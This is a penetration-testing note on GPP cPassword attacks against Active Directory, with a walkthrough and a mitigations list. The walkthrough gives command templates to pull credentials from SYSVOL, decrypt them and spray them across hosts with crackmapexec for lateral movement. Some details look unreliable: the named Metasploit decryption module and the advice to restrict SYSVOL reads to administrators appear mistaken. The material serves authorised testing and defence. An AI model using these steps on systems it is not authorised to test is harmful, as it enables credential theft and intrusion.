# GPP cPassword Attacks

- Group Policy Preferences (GPP) allowed administrators to create policies with embedded credentials for tasks like service account management.
- These credentials were encrypted and stored in a "cPassword" field within Group Policy XML files.
- Microsoft's encryption key was accidentally released publicly, allowing anyone to decrypt the cPassword values.
- Patched in MS14-025 (KB2962486), but the patch only prevents creation of new encrypted credentials—it does not remove or decrypt existing vulnerable files.
- This makes GPP cPassword attacks highly relevant on penetration tests, as legacy deployments often retain old GPP files in SYSVOL.

## Walkthrough

1. Enumerate GPP Files from SYSVOL

Use Metasploit's `smb_enum_gpp` module to access the SYSVOL of the domain controller and extract Group Policy Preference files:

```bash
msfconsole
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <domain_controller_ip>
set SMBUser <domain_user>
set SMBPass <domain_password>
set SMBDomain <domain_name>
run
```

Alternatively, you can manually mount SYSVOL and search for XML files containing cPassword:

```bash
mount -t cifs //<domain_controller>\SYSVOL /mnt/sysvol -o username=<user>,password=<pass>
grep -r "cPassword" /mnt/sysvol
```

2. Decrypt cPassword Values

Once you identify files with cPassword entries, use tools to decrypt them. Common approaches include:

- **Using Metasploit decrypt module**:

  ```bash
  use post/windows/gather/credentials/credential_collector
  ```

- **Using impacket-Get-GPPPassword** or similar custom tools that implement the known decryption algorithm.

- **Using CyberChef** or **gpp-decrypt** online tools (not recommended for sensitive environments).

3. Validate and Use Credentials

Test the decrypted credentials on domain systems:

```bash
crackmapexec smb <target_range> -u <username> -p <decrypted_password> -d <domain>
```

Apply lateral movement techniques with the recovered credentials.

## Mitigations

- **Apply MS14-025 (KB2962486)**: Patch all systems to prevent creation of new encrypted credentials in Group Policy Preferences. However, this is not sufficient alone.
- **Delete Legacy GPP XML Files**: Manually remove or audit old GPP XML files stored in `\\<domain>\SYSVOL\<domain>\Policies\` that may contain cPassword entries. Use:

  ```bash
  # List all GPP files
  ls /mnt/sysvol/Policies/*/User/ | grep ".*\.xml"

  # Audit and remove vulnerable Group Policy Objects
  ```

- **Restrict SYSVOL Access**: Limit read access to SYSVOL to only authorized administrators.
- **Monitor for GPP Enumeration**: Alert on unusual SMB connections to domain controllers and SYSVOL access attempts.
- **Use Group Policy Managed Service Accounts (gMSA)**: Replace embedded credentials with gMSA for service accounts, which have auto-rotating passwords managed by the domain.
